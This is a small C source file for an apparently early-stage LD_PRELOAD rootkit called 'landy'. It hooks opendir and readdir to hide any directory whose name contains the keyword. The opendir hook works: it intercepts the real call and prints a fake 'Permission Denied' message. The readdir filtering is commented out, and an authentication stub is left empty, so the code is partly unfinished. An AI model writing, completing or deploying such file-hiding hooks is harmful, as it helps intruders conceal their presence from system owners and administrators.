#define _GNU_SOURCE
/*
*@@@ landy @@@
*Hooks system calls to hide files using a keyword
*
*/
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <errno.h>
#include <dirent.h>
#include <string.h>

#define keyword "landy"

int ismaster(){
    //TODO find a good way to verify that master is master
}

//delcare the old functions :)
DIR *(*old_opendir)(const char *name);
struct dirent *(*old_readdir)(DIR *dirp);

//hook the opendir function
DIR *opendir(const char *name){
    
    if(!old_opendir){
	old_opendir = dlsym(RTLD_NEXT,"opendir");
    }

    //hide file here
    if(strstr(name,keyword)){
	fprintf(stderr,"Permission Denied\n");
	return 0;
    }

    return old_opendir(name);
}

struct dirent *readdir(DIR *dirp){
   
    struct dirent *dir;

    if(!old_readdir){
	old_readdir = dlsym(RTLD_NEXT,"readdir");
    }
    
    //TODO look into dirfd()

    //dir = old_readdir(dirp);
    //printf("%s",dir->d_name);
    //if(strstr(dir->d_name,keyword)){
	//printf("Hello");
   // }

    return old_readdir(dirp);

}



